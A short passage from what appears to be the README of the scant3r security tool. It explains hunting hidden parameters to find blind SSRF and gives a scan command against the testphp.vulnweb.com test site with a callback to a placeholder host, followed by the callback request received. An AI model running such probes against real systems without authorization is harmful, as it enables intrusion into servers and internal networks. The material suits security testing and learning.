if you find any endpoints, you need to check for hidden parameters by using `Arjun/ParamPamPam`, this tools works on reflect parameter value/name in page or the response changes from 200 to 500, but you need to check for hidden parameters for find blind ssrf
```sh
$ echo 'http://testphp.vulnweb.com/showimage.php' | python3 scant3r.py -m lorsrf -w 100 -R -x http://yourhost.com -y GET,POST,PUT
```
Response from Target
```
file -> hidden parameter

GET /file HTTP/1.1
Host: myhost:2020
User-Agent: curl/7.68.0
Accept: */*
```

![](https://raw.githubusercontent.com/knassar702/scant3r/master/.src/ssrf.gif)